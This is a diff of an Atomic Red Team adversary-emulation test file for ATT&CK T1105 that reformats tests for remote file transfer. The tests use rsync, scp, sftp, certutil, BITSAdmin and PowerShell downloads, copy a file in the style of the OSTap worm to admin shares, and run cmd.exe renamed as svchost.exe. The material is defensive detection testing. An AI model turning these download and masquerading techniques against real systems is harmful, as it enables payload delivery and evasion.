@@ -1,16 +1,22 @@
----
-attack_technique: T1105
-display_name: Remote File Copy
-
+attack_technique:
+- T1105
+display_name: Ingress Tool Transfer
 atomic_tests:
 - name: rsync remote file copy (push)
-  auto_generated_guid: 0fc6e977-cb12-44f6-b263-2824ba917409
   description: |
     Utilize rsync to perform a remote file copy (push)
   supported_platforms:
-    - linux
-    - macos
+  - linux
+  - macos
   input_arguments:
+    remote_path:
+      description: Remote path to receive rsync
+      type: Path
+      default: /tmp/victim-files
+    remote_host:
+      description: Remote host to copy toward
+      type: String
+      default: victim-host
     local_path:
       description: Path of folder to copy
       type: Path
@@ -19,35 +25,21 @@ atomic_tests:
       description: User account to authenticate on remote host
       type: String
       default: victim
-    remote_host:
-      description: Remote host to copy toward
-      type: String
-      default: victim-host
-    remote_path:
-      description: Remote path to receive rsync
-      type: Path
-      default: /tmp/victim-files
   executor:
-    name: bash
     command: |
       rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
-
+    name: bash
 - name: rsync remote file copy (pull)
-  auto_generated_guid: 3180f7d5-52c0-4493-9ea0-e3431a84773f
   description: |
     Utilize rsync to perform a remote file copy (pull)
   supported_platforms:
-    - linux
-    - macos
+  - linux
+  - macos
   input_arguments:
     remote_path:
       description: Path of folder to copy
       type: Path
       default: /tmp/adversary-rsync/
-    username:
-      description: User account to authenticate on remote host
-      type: String
-      default: adversary
     remote_host:
       description: Remote host to copy from
       type: String
@@ -56,56 +48,48 @@ atomic_tests:
       description: Local path to receive rsync
       type: Path
       default: /tmp/victim-files
-  executor:
-    name: bash
-    command: |
-      rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
-
-- name: scp remote file copy (push)
-  auto_generated_guid: 83a49600-222b-4866-80a0-37736ad29344
-  description: |
-    Utilize scp to perform a remote file copy (push)
-  supported_platforms:
-    - linux
-    - macos
-  input_arguments:
-    local_file:
-      description: Path of file to copy
-      type: Path
-      default: /tmp/adversary-scp
-    username:
-      description: User account to authenticate on remote host
-      type: String
-      default: victim
-    remote_host:
-      description: Remote host to copy toward
-      type: String
-      default: victim-host
-    remote_path:
-      description: Remote path to receive scp
-      type: Path
-      default: /tmp/victim-files/
-  executor:
-    name: bash
-    command: |
-      scp #{local_file} #{username}@#{remote_host}:#{remote_path}
-
-- name: scp remote file copy (pull)
-  auto_generated_guid: b9d22b9a-9778-4426-abf0-568ea64e9c33
-  description: |
-    Utilize scp to perform a remote file copy (pull)
-  supported_platforms:
-    - linux
-    - macos
-  input_arguments:
-    remote_file:
-      description: Path of file to copy
-      type: Path
-      default: /tmp/adversary-scp
     username:
       description: User account to authenticate on remote host
       type: String
       default: adversary
+  executor:
+    command: |
+      rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
+    name: bash
+- name: scp remote file copy (push)
+  description: |
+    Utilize scp to perform a remote file copy (push)
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    remote_path:
+      description: Remote path to receive scp
+      type: Path
+      default: /tmp/victim-files/
+    local_file:
+      description: Path of file to copy
+      type: Path
+      default: /tmp/adversary-scp
+    remote_host:
+      description: Remote host to copy toward
+      type: String
+      default: victim-host
+    username:
+      description: User account to authenticate on remote host
+      type: String
+      default: victim
+  executor:
+    command: |
+      scp #{local_file} #{username}@#{remote_host}:#{remote_path}
+    name: bash
+- name: scp remote file copy (pull)
+  description: |
+    Utilize scp to perform a remote file copy (pull)
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
     remote_host:
       description: Remote host to copy from
       type: String
@@ -114,56 +98,52 @@ atomic_tests:
       description: Local path to receive scp
       type: Path
       default: /tmp/victim-files/
-  executor:
-    name: bash
-    command: |
-      scp #{username}@#{remote_host}:#{remote_file} #{local_path}
-
-- name: sftp remote file copy (push)
-  auto_generated_guid: f564c297-7978-4aa9-b37a-d90477feea4e
-  description: |
-    Utilize sftp to perform a remote file copy (push)
-  supported_platforms:
-    - linux
-    - macos
-  input_arguments:
-    local_file:
-      description: Path of file to copy
-      type: Path
-      default: /tmp/adversary-sftp
-    username:
-      description: User account to authenticate on remote host
-      type: String
-      default: victim
-    remote_host:
-      description: Remote host to copy toward
-      type: String
-      default: victim-host
-    remote_path:
-      description: Remote path to receive sftp
-      type: Path
-      default: /tmp/victim-files/
-  executor:
-    name: bash
-    command: |
-      sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
-
-- name: sftp remote file copy (pull)
-  auto_generated_guid: 0139dba1-f391-405e-a4f5-f3989f2c88ef
-  description: |
-    Utilize sftp to perform a remote file copy (pull)
-  supported_platforms:
-    - linux
-    - macos
-  input_arguments:
     remote_file:
       description: Path of file to copy
       type: Path
-      default: /tmp/adversary-sftp
+      default: /tmp/adversary-scp
     username:
       description: User account to authenticate on remote host
       type: String
       default: adversary
+  executor:
+    command: |
+      scp #{username}@#{remote_host}:#{remote_file} #{local_path}
+    name: bash
+- name: sftp remote file copy (push)
+  description: |
+    Utilize sftp to perform a remote file copy (push)
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    remote_path:
+      description: Remote path to receive sftp
+      type: Path
+      default: /tmp/victim-files/
+    local_file:
+      description: Path of file to copy
+      type: Path
+      default: /tmp/adversary-sftp
+    remote_host:
+      description: Remote host to copy toward
+      type: String
+      default: victim-host
+    username:
+      description: User account to authenticate on remote host
+      type: String
+      default: victim
+  executor:
+    command: |
+      sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
+    name: bash
+- name: sftp remote file copy (pull)
+  description: |
+    Utilize sftp to perform a remote file copy (pull)
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
     remote_host:
       description: Remote host to copy from
       type: String
@@ -172,16 +152,23 @@ atomic_tests:
       description: Local path to receive sftp
       type: Path
       default: /tmp/victim-files/
+    remote_file:
+      description: Path of file to copy
+      type: Path
+      default: /tmp/adversary-sftp
+    username:
+      description: User account to authenticate on remote host
+      type: String
+      default: adversary
   executor:
-    name: bash
     command: |
       sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
+    name: bash
 - name: certutil download (urlcache)
-  auto_generated_guid: dd3b61dd-7bbc-48cd-ab51-49ad1a776df0
   description: |
     Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     remote_file:
       description: URL of file to copy
@@ -192,16 +179,14 @@ atomic_tests:
       type: Path
       default: Atomic-license.txt
   executor:
-    name: command_prompt
-    elevation_required: false
     command: |
       cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
+    name: command_prompt
 - name: certutil download (verifyctl)
-  auto_generated_guid: ffd492e3-0455-4518-9fb1-46527c9f241b
   description: |
     Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     remote_file:
       description: URL of file to copy
@@ -212,47 +197,42 @@ atomic_tests:
       type: Path
       default: Atomic-license.txt
   executor:
-    name: powershell
-    elevation_required: false
     command: |
       $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
       New-Item -Path $datePath -ItemType Directory
       Set-Location $datePath
       certutil -verifyctl -split -f #{remote_file}
       Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
-
+    name: powershell
 - name: Windows - BITSAdmin BITS Download
-  auto_generated_guid: a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b
   description: |
     This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.
     This technique is used by Qbot malware to download payloads.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     bits_job_name:
       description: Name of the created BITS job
       type: String
       default: qcxjb7
-    remote_file:
-      description: URL of file to copy
-      type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
     local_path:
       description: Local path to place file
       type: Path
       default: Atomic-license.txt
+    remote_file:
+      description: URL of file to copy
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
   executor:
-    name: command_prompt
     command: |
       C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
-
+    name: command_prompt
 - name: Windows - PowerShell Download
-  auto_generated_guid: 42dc4460-9aa6-45d3-b1a6-3955d34e1fe8
   description: |
     This test uses PowerShell to download a payload.
     This technique is used by multiple adversaries and malware families.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     remote_file:
       description: URL of file to copy
@@ -263,48 +243,42 @@ atomic_tests:
       type: Path
       default: $env:TEMP\Atomic-license.txt
   executor:
-    name: powershell
     command: |
       (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
     cleanup_command: |
       Remove-Item #{destination_path} -Force -ErrorAction Ignore
-
+    name: powershell
 - name: OSTAP Worming Activity
-  auto_generated_guid: 2ca61766-b456-4fcf-a35a-1233685e1cad
   description: |
     OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     destination_path:
       description: Path to create remote file at. Default is local admin share.
       type: String
-      default: \\localhost\C$
+      default: '\\localhost\C$'
   executor:
+    command: |
+      pushd #{destination_path}
+      echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
+      CScript.exe AtomicTestT1105.js //E:JScript
+      del AtomicTestT1105.js /Q >nul 2>&1
+      del AtomicTestFileT1105.js /Q >nul 2>&1
+      popd
     name: command_prompt
     elevation_required: true
-    command: |
-       pushd #{destination_path}
-       echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
-       CScript.exe AtomicTestT1105.js //E:JScript
-       del AtomicTestT1105.js /Q >nul 2>&1
-       del AtomicTestFileT1105.js /Q >nul 2>&1
-       popd
-
 - name: svchost writing a file to a UNC path
-  auto_generated_guid: fa5a2759-41d7-4e13-a19c-e8f28a53566f
   description: |
     svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
     Upon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\`, then execute svchost.exe with output to a txt file.
   supported_platforms:
-    - windows
+  - windows
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       copy C:\Windows\System32\cmd.exe C:\svchost.exe
       C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
-    cleanup_command: |
-      del C:\T1055.txt >nul 2>&1
-      del C:\svchost.exe >nul 2>&1
-       
+    cleanup_command: "del C:\\T1055.txt >nul 2>&1\ndel C:\\svchost.exe >nul 2>&1\n "
+    name: command_prompt
+    elevation_required: true
+
